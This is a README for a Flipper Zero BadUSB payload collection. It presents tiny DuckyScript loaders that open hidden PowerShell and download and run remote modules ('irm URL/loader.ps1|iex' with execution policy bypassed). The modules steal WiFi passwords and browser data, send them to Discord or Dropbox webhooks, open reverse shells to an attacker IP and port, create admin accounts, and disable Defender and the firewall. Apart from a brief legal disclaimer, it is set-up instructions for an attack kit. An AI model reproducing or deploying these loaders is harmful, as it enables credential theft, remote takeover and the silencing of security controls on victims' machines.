# 🎯 Flipper Zero Payloads

> **Ultra-minimal DuckyScript loaders for Flipper Zero**

This directory contains all the **DuckyScript payloads** that you copy to your Flipper Zero. Each payload is a tiny "loader" that downloads and executes a remote PowerShell/Bash module.

---

## 📁 Structure

```
payloads/
├── windows/           # Windows 10/11 payloads
│   ├── exfiltration/  # Data extraction
│   ├── execution/     # System execution
│   ├── fun/           # Pranks & demos
│   ├── recon/         # Reconnaissance
│   ├── persistence/   # Persistent access
│   └── goodusb/       # Helpful scripts
├── linux/             # Linux payloads
│   ├── exfiltration/
│   ├── execution/
│   ├── fun/
│   ├── recon/
│   └── persistence/
├── macos/             # macOS payloads
│   ├── exfiltration/
│   ├── execution/
│   ├── fun/
│   └── recon/
└── ios/               # iPhone/iPad payloads
    ├── execution/
    └── pranks/
```

---

## 🚀 How It Works

### The Modular System

Instead of hardcoding everything in DuckyScript, we use tiny "loaders":

```duckyscript
REM Old way (BAD - long, hard to update):
STRING powershell -w h (50 lines of PowerShell code here...)

REM New way (GOOD - minimal, easy to update):
STRING powershell -w h -ep bypass "$env:DC='webhook';$env:M='wifi';irm URL/loader.ps1|iex"
```

### Benefits

| Feature | Old Method | Modular Method |
|---------|------------|----------------|
| Payload size | ~50 lines | **~15 lines** |
| Updates | Edit every file | **Update remote once** |
| Configuration | Hardcoded | **Environment variables** |
| Mix & match | No | **Yes** |

---

## ⚙️ Configuration

### Environment Variables

| Variable | Purpose | Example |
|----------|---------|---------|
| `DC` | Discord webhook URL | `https://discord.com/api/webhooks/...` |
| `DB` | Dropbox token | `sl.XXXXX...` |
| `M` | Module to load | `wifi`, `screenshot`, `shell` |
| `IP` | Attacker IP | `192.168.1.100` |
| `PT` | Port | `4444` |
| `U` | Custom URL | `https://example.com/image.jpg` |
| `MSG` | Custom message | `You have been hacked!` |

### Quick Setup

1. **Get a Discord webhook** (for receiving data):
   - Create/open Discord server
   - Server Settings → Integrations → Webhooks
   - Create webhook, copy URL

2. **Edit the payload**:
   - Replace `YOUR_DISCORD_WEBHOOK` with your URL
   - Replace other placeholders as needed

3. **Copy to Flipper**:
   - Connect Flipper Zero
   - Copy `.txt` file to `SD Card/badusb/`

4. **Run**:
   - Bad USB → Select payload → Run

---

## 📦 Available Modules

### Windows

| Module | Command | Description |
|--------|---------|-------------|
| `wifi` | `$env:M='wifi'` | WiFi passwords |
| `screenshot` | `$env:M='screenshot'` | Take screenshot |
| `sysinfo` | `$env:M='sysinfo'` | System info |
| `browser` | `$env:M='browser'` | Browser data |
| `ip` | `$env:M='ip'` | IP + geolocation |
| `shell` | `$env:M='shell'` | Reverse shell |
| `admin` | `$env:M='admin'` | Create admin |
| `rdp` | `$env:M='rdp'` | Enable RDP |
| `defender` | `$env:M='defender'` | Disable Defender |
| `firewall` | `$env:M='firewall'` | Disable firewall |
| `recon` | `$env:M='recon'` | Full recon |
| `persist` | `$env:M='persist'` | Persistence |
| `rickroll` | `$env:M='rickroll'` | Rick Roll 🎵 |
| `bsod` | `$env:M='bsod'` | Fake BSOD |
| `wallpaper` | `$env:M='wallpaper'` | Change wallpaper |
| `tts` | `$env:M='tts'` | Text to speech |

### Linux & macOS

Same module names work on Linux and macOS!

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

Only use on systems you own or have explicit written permission to test. Unauthorized access is illegal.

See [DISCLAIMER.md](../DISCLAIMER.md).

